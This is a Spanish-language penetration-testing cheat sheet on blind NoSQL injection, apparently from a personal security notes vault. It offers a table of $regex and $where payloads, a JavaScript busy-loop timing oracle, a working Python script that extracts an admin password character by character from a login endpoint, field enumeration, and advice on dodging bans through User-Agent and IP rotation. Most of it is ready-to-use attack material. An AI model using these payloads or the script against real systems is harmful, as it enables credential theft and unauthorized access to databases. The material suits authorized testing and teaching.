---
aliases:
  - NoSQL Blind Injection
  - Boolean-based NoSQLi
  - Time-based NoSQLi
  - NoSQL Char-by-char exfil
tags:
  - vuln/nosqli
  - technique/exfiltration
  - asset/database
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[NoSQL Injection]]"
---
# NoSQLi - Extracción Blind

***

## Cheatsheet

| **Técnica** | **Payload** | **Oracle / Señal** |
|:---:|:---:|---|
| **$regex startsWith** | `{"user":"admin","pass":{"$regex":"^a"}}` | 200 login ok = pass empieza con 'a'. 401 = no. |
| **$regex anchor + char** | `{"user":"admin","pass":{"$regex":"^ab"}}` | Avanzar char-por-char. Charset `[a-zA-Z0-9!@#$...]`. |
| **$regex length** | `{"user":"admin","pass":{"$regex":"^.{12}$"}}` | Probar longitud exacta del password. |
| **$where char extract** | `{"$where":"this.user=='admin' && this.password[0]=='a'"}` | JS direct — más control que regex. |
| **Boolean timing ($where)** | `{"$where":"this.password[0]=='a' && function(){var d=Date.now();while(Date.now()-d<3000){}return true}()"}` | 3s delay si match. |
| **$regex con negación** | `{"pass":{"$not":{"$regex":"^[a-m]"}}}` | Búsqueda binaria: rango superior o inferior del charset. |
| **Enum de collection via regex** | `{"username":{"$regex":"^.*"}}` | Lista usernames (si app retorna cantidad o primer match). |
| **String length via $where** | `{"$where":"this.secret.length > 10"}` | Binary search de longitud. |
^nosqli-blind

___

## Overview

Cuando el SSRF/NoSQLi no refleja datos directamente (blind), se extrae info **char-por-char** usando:
1. **Boolean oracle** — diff de response (200/401, body con/sin data, flag success).
2. **Timing oracle** — loop JS en `$where` para delay conditional.

### Boolean-based char-by-char (el más común)

Algoritmo:
```
1. Confirmar que {"user":"admin","pass":{"$regex":"^"}}  →  login success (anchor válido).
2. Iterar charset [a-z0-9]:
   - Probar {"pass":{"$regex":"^a"}} → si 200: char[0]='a'.
   - Probar {"pass":{"$regex":"^b"}} → si 200: char[0]='b'.
3. Una vez char[0] known, iterar char[1]:
   - {"pass":{"$regex":"^<char[0]>a"}} → ...
4. Repetir hasta response con `^<pass_completo>$` returns success.
```

Script Python example:
```python
import requests
import string

chars = string.ascii_letters + string.digits + "!@#$%^&*()"
password = ""

while True:
    found = False
    for c in chars:
        r = requests.post('http://target/login', json={
            'username': 'admin',
            'password': {'$regex': f'^{password}{c}'}
        })
        if r.status_code == 200 and 'Welcome' in r.text:
            password += c
            print(f"[+] Pass so far: {password}")
            found = True
            break
    if not found:
        break

print(f"[+] Final: {password}")
```

### Time-based (cuando no hay boolean diff)

Si response es idéntica match/no-match, usar timing via `$where`:
```json
{
    "username": "admin",
    "$where": "this.password[0] === 'a' && function(){var d=Date.now();while(Date.now()-d<3000){}return true}()"
}
```

Response >3s = char matchea.

### Binary search optimization

En vez de probar 26+ chars linealmente, búsqueda binaria:
```json
{"pass":{"$regex":"^[a-m]"}}   ← primer char en a-m?
{"pass":{"$regex":"^[a-f]"}}   ← a-f?
{"pass":{"$regex":"^[a-c]"}}   ← a-c?
...
```

~5 requests por char (`log2(26) ≈ 5`) vs 26 lineales.

### Regex special chars (escapar)

Si el password contiene `.`, `*`, `+`, `?`, `(`, `)`, `[`, `]`, `\`, escapar con `\\`:
```json
{"pass":{"$regex":"^a\\."}}
```

### Enum de fields / collections

Algunos drivers exponen errores con names de fields al fallar queries:
```json
{"$where":"Object.keys(this).join(',')"}
```

Si `$where` retorna string → enum de field names. Poco común pero útil en ctx de debug.

### Herramienta

```bash
# NoSQLMap con blind mode
python NoSQLMap.py --blind

# Custom script Python (patrón arriba)
python3 nosqli_blind.py --url http://target/login --field password
```

### Rate limiting

Blind extraction = cientos de requests. Considerar:
- Threading para paralelizar (charset en paralelo).
- Respetar rate limits del server.
- Usar `time.sleep(0.1)` entre requests si el server se protege.
- Cambiar User-Agent / IP rotation si hay ban.

***
